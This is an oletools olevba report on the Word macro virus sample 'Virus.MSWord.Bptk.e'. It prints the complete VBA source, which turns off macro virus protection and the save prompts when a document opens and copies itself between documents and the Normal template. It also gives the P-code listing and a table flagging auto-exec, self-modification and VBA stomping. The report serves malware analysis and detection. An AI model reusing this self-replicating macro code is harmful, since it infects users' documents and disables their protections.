olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bptk.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bptk.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next 'E
On Error Resume Next 'D
Application.EnableCancelKey = 0
With Options:
.ConfirmConversions = 0
.SaveNormalPrompt = 0
.VirusProtection = 0
End With
t = "D"
If ActiveDocument.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'E" Then
Set d = ActiveDocument.VBProject.VBComponents.Item(1)
Set c = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'E" Then
Set d = NormalTemplate.VBProject.VBComponents.Item(1)
Set c = ActiveDocument.VBProject.VBComponents.Item(1)
Else: t = ""
End If
If t <> "" Then
d.Codemodule.DeleteLines 1, d.Codemodule.CountOfLines
d.Codemodule.AddFromString c.Codemodule.Lines(1, c.Codemodule.CountOfLines)
ActiveDocument.Save
NormalTemplate.Save
GoTo 30
End If
Randomize
If Rnd < 0.2 Then
MsgBox "ß å..ëñÿ ñ ýòîé êíîïêîé."
MsgBox "Òû å..èñü ïîíàæèìàé !"
GoTo 20
End If
If Rnd < 0.1 Then
MsgBox "Çà..áàëà ìåíÿ êíîïêà."
MsgBox "Ïîå..èñü òåïåðü è òû !"
End If
20 If Rnd < 0.1 Then MsgBox "John  ÁÃÒÓ  Áðÿíñê 2001 ã. (â îòâåò ÁÏÒÊàì)": GoTo 30
30 End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bptk.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7107 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0001 "E"
' Line #2:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0001 "D"
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #4:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' Line #5:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #6:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #7:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #8:
' 	EndWith 
' Line #9:
' 	LitStr 0x0001 "D"
' 	St t 
' Line #10:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "On Error Resume Next 'E"
' 	Ne 
' 	IfBlock 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set d 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set c 
' Line #13:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "On Error Resume Next 'E"
' 	Ne 
' 	ElseIfBlock 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set d 
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set c 
' Line #16:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St t 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld d 
' 	MemLd Codemodule 
' 	MemLd CountOfLines 
' 	Ld d 
' 	MemLd Codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #20:
' 	LitDI2 0x0001 
' 	Ld c 
' 	MemLd Codemodule 
' 	MemLd CountOfLines 
' 	Ld c 
' 	MemLd Codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld d 
' 	MemLd Codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #21:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #22:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #23:
' 	GoTo 30 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	ArgsCall Read 0x0000 
' Line #26:
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FC9 
' 	Lt 
' 	IfBlock 
' Line #27:
' 	LitStr 0x0018 "ß å..ëñÿ ñ ýòîé êíîïêîé."
' 	ArgsCall MsgBox 0x0001 
' Line #28:
' 	LitStr 0x0015 "Òû å..èñü ïîíàæèìàé !"
' 	ArgsCall MsgBox 0x0001 
' Line #29:
' 	GoTo 20 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Lt 
' 	IfBlock 
' Line #32:
' 	LitStr 0x0015 "Çà..áàëà ìåíÿ êíîïêà."
' 	ArgsCall MsgBox 0x0001 
' Line #33:
' 	LitStr 0x0016 "Ïîå..èñü òåïåðü è òû !"
' 	ArgsCall MsgBox 0x0001 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	LineNum 20 
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002B "John  ÁÃÒÓ  Áðÿíñê 2001 ã. (â îòâåò ÁÏÒÊàì)"
' 	ArgsCall MsgBox 0x0001 
' 	BoS 0x0000 
' 	GoTo 30 
' 	EndIf 
' Line #36:
' 	LineNum 30 
' 	EndSub 
' Line #37:
' Line #38:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

